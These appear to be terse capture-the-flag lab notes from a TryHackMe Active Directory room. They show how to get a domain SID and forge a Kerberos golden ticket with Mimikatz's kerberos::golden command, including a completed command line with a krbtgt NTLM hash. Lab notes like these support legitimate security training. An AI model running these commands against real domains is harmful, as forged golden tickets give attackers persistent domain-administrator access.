Need the krbtgt account password hash
Need Domain SID:
```
PS C:\Users\Administrator.ZA> Get-ADDomain

DomainSID                          : S-1-5-21-3885271727-2693558621-2658995185
```

Generate a golden ticket:
```
kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
```

Test golden ticket
```
\\<ip or hostname>\c$\
```

kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt